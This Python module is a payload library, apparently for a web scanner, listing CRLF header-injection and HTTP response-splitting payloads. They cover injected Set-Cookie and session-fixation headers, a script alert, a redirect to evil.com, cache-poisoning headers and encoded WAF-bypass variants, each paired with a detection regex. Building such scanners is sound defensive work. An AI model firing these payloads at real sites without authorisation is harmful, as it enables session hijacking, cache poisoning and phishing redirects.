"""
HTTP Header Injection (CRLF) Payloads

Collection of payloads for detecting CRLF injection and HTTP response splitting vulnerabilities.
"""

from dataclasses import dataclass
from typing import List


@dataclass
class HeaderInjectionPayload:
    """Header injection payload."""
    payload: str
    technique: str
    description: str
    waf_bypass: bool
    risk_indicator: str
    impact: str  # response_split|xss|cache_poison|session_fixation


def get_header_injection_payloads() -> List[HeaderInjectionPayload]:
    """Get all header injection payloads."""

    payloads = []

    # ==== BASIC CRLF INJECTION ====

    # Simple Set-Cookie injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nSet-Cookie: injected=true",
        technique="crlf_basic",
        description="Inject Set-Cookie header",
        waf_bypass=False,
        risk_indicator="Set-Cookie:.*injected",
        impact="session_fixation"
    ))

    # Custom header injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nX-Injected-Header: malicious",
        technique="crlf_basic",
        description="Inject custom header",
        waf_bypass=False,
        risk_indicator="X-Injected-Header",
        impact="response_split"
    ))

    # ==== HTTP RESPONSE SPLITTING ====

    # Full response split with XSS
    payloads.append(HeaderInjectionPayload(
        payload="\r\n\r\n<script>alert('XSS')</script>",
        technique="response_splitting",
        description="Split response and inject XSS",
        waf_bypass=False,
        risk_indicator="<script>alert",
        impact="xss"
    ))

    # Response split with redirect
    payloads.append(HeaderInjectionPayload(
        payload="\r\nLocation: http://evil.com\r\n\r\n",
        technique="response_splitting",
        description="Inject redirect header",
        waf_bypass=False,
        risk_indicator="Location:.*evil",
        impact="response_split"
    ))

    # ==== ENCODING BYPASSES ====

    # URL-encoded CRLF
    payloads.append(HeaderInjectionPayload(
        payload="%0d%0aSet-Cookie: injected=true",
        technique="url_encoded",
        description="URL-encoded CRLF",
        waf_bypass=True,
        risk_indicator="Set-Cookie:.*injected",
        impact="session_fixation"
    ))

    # Double URL-encoded CRLF
    payloads.append(HeaderInjectionPayload(
        payload="%250d%250aSet-Cookie: injected=true",
        technique="double_encoded",
        description="Double URL-encoded CRLF",
        waf_bypass=True,
        risk_indicator="Set-Cookie:.*injected",
        impact="session_fixation"
    ))

    # UTF-8 encoded CRLF
    payloads.append(HeaderInjectionPayload(
        payload="%E5%98%8A%E5%98%8DSet-Cookie: injected=true",
        technique="utf8_encoded",
        description="UTF-8 overlong encoding",
        waf_bypass=True,
        risk_indicator="Set-Cookie:.*injected",
        impact="session_fixation"
    ))

    # Unicode CRLF
    payloads.append(HeaderInjectionPayload(
        payload="\u000d\u000aSet-Cookie: injected=true",
        technique="unicode",
        description="Unicode CRLF characters",
        waf_bypass=True,
        risk_indicator="Set-Cookie:.*injected",
        impact="session_fixation"
    ))

    # ==== CACHE POISONING ====

    # Cache control injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nCache-Control: public, max-age=31536000",
        technique="cache_poison",
        description="Force caching of sensitive data",
        waf_bypass=False,
        risk_indicator="Cache-Control:.*public",
        impact="cache_poison"
    ))

    # Vary header injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nVary: User-Agent\r\nX-Cache-Key: poisoned",
        technique="cache_poison",
        description="Cache key poisoning",
        waf_bypass=False,
        risk_indicator="X-Cache-Key",
        impact="cache_poison"
    ))

    # ==== SESSION FIXATION ====

    # JSESSIONID injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nSet-Cookie: JSESSIONID=fixed_session_id; Path=/",
        technique="session_fixation",
        description="Fix Java session ID",
        waf_bypass=False,
        risk_indicator="JSESSIONID=fixed",
        impact="session_fixation"
    ))

    # ASP.NET session injection
    payloads.append(HeaderInjectionPayload(
        payload="\r\nSet-Cookie: ASP.NET_SessionId=fixed; HttpOnly",
        technique="session_fixation",
        description="Fix ASP.NET session",
        waf_bypass=False,
        risk_indicator="ASP.NET_SessionId=fixed",
        impact="session_fixation"
    ))

    return payloads


def get_response_splitting_payloads() -> List[HeaderInjectionPayload]:
    """Get HTTP response splitting payloads."""
    all_payloads = get_header_injection_payloads()
    return [p for p in all_payloads if p.impact == 'response_split' or p.technique == 'response_splitting']


def get_session_fixation_payloads() -> List[HeaderInjectionPayload]:
    """Get session fixation payloads."""
    all_payloads = get_header_injection_payloads()
    return [p for p in all_payloads if p.impact == 'session_fixation']


def get_waf_bypass_payloads() -> List[HeaderInjectionPayload]:
    """Get WAF bypass variants."""
    all_payloads = get_header_injection_payloads()
    return [p for p in all_payloads if p.waf_bypass]
